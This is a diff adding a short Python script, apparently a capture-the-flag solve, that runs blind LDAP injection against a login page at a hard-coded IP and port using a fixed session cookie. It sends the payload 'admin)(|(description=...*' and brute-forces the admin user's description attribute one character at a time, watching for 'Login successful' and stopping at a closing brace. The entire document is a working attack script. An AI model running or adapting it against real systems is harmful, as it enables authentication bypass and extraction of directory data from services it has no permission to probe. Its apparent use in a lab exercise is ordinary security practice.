@@ -1,0 +1,64 @@
+
+##
+## totally just for fun tho
+##
+
+import requests
+import string
+
+url = "http://94.237.56.188:33236/index.php"
+cookies = {"PHPSESSID": "dih4lh8kp133il4cu4pur7mo8v"}
+headers = {
+    "Host": "94.237.56.188:33236",
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Content-Length": "54",
+    "Origin": "http://94.237.56.188:33236",
+    "DNT": "1",
+    "Sec-GPC": "1",
+    "Connection": "close",
+    "Referer": "http://94.237.56.188:33236/index.php",
+    "Cookie": "PHPSESSID=dih4lh8kp133il4cu4pur7mo8v",
+    "Upgrade-Insecure-Requests": "1"
+}
+
+# Target username for the 'admin' user
+target_username = "admin"
+
+# Payload template for brute-force
+payload_template = "username=admin)(|(description={}{}*&password=invalid)"
+
+# Characters to iterate through (printable ASCII characters)
+possible_chars = string.printable
+
+# Fixed length assumption for 'description' attribute
+description_length = 50
+
+# Brute-force each character
+found_description = ""
+for position in range(1, description_length + 1):
+    found_char = None
+    for char in possible_chars:
+        payload = payload_template.format(found_description, char)
+        response = requests.post(url, headers=headers, cookies=cookies, data=payload)
+
+        if "Login successful" in response.text:
+            found_char = char
+            found_description += char
+            print(f"Found character at position {position}: {char}")
+            break
+
+    # Break the loop if the closing curly brace is found
+    if found_char == "}":
+        break
+
+
+##
+##
+
+
+
+print(f"Found 'admin' description: {found_description}")
